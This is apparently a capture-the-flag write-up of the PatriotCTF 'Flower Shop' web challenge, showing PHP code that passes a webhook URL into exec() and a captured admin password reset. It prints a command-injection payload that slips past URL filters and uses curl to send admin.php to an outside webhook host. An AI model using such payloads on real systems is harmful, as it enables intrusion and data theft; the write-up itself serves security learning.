---
layout: post
current: post
cover:  assets/patriot/flowershop/cover.webp
navigation: True
title: "Flower Shop"
date: 2023-09-10 22:00:00
tags: [PatriotCTF, web]
class: post-template
subclass: 'post'
author: nisala
---

Bad news: pay-to-win made it to CTFs. Good news: we paid first.

In this challenge, we're presented with a basic user management system:

![Sign up, login, and password reset screen](assets/patriot/flowershop/image1.webp)

Alright, login, signup, and password reset. Pretty standard stuff. The one difference is in the password reset system. Instead of providing an email, you have to provide a webhook URL.

## The Intended Solution

One look at the password reset system and it's immediately obvious what the vulnerability is.

```php
public function resetPassword() {
    $this->wh = $this->checkUser($this->uid);
    if (!$this->wh) {
        header("location: ../login.php?error=InvalidUser");
        exit();
    }

    $this->tmpPass = $this->tmpPwd($this->uid);

    exec("php ../scripts/send_pass.php " . $this->tmpPass . " " . $this->wh . " > /dev/null 2>&1 &");

    return $this->tmpPass;
}
```

A call to `exec`? It's practically asking to be exploited -- and you very easily can. The webhook is validated, but the valdation is done very insecurely, using PHP filters:

```php
$this->wh = filter_var($wh, FILTER_SANITIZE_URL);
...
if (!filter_var($this->wh, FILTER_VALIDATE_URL)) {
    header("location: ../login.php?error=NotValidWebhook");
    exit();
}
```

`FILTER_SANITIZE_URL` is the easiest check to get around -- it just removes some illegal characters. `FILTER_VALIDATE_URL` hypothetically validates the URL against RFC2396, but there are lots of payloads that get around it. The flag is stored in `../admin.php`, so this is about how far we got on the payload before finding our unintentional solution:

```
0://google.com;curl${IFS}-d${IFS}@../../admin.php${IFS}https://webhook.site/nisala;
```

This bypasses the URL filter, and allows us to run a command with the insecure use of `exec`. We were still ironing out exactly how to use `${IFS}` to get spaces when we found an unintentional solution.

## The Unintentional Solution

So the flag is stored at `admin.php`, right? What's stopping us from just going there?

```php
if ($_SESSION['username'] !== "admin" ) {
    header("Location: login.php?error=notadmin");
    exit();
}
```

Our username needs to be `admin`, huh? Well, we can't register as `admin`, so it's clearly getting pre-created. Is that in the code?

```php
private function initDB() {
    $stmt = $this->connect()->prepare('INSERT INTO users (username, password, webhook)
    VALUES ("admin", :password, :webhook)');
    $stmt->bindValue(':password', $hashedPwd);
    $stmt->bindValue(':webhook', "https://webhook.site/fake");
    $stmt->execute();
}
```

So it seems that `admin`'s password resets are being sent to `webhook.site/fake`. If we can see those, we can just log in as admin and get the flag. Now, this may seem far-fetched, but... can we control that URL?

![webhook.site page that shows premium tier has custom aliases](assets/patriot/flowershop/image2.webp)

Oh my god. So, does that mean...

![webhook.site page showing control of webhook.site/fake](assets/patriot/flowershop/image3.webp)

Yes. Yes it does. Let's send in a password reset for admin.

![webhook.site/fake showing the password](assets/patriot/flowershop/image4.webp)

And now we just sign in and claim our prize.

![flag, logged in as admin on the flower shop website](assets/patriot/flowershop/image5.webp)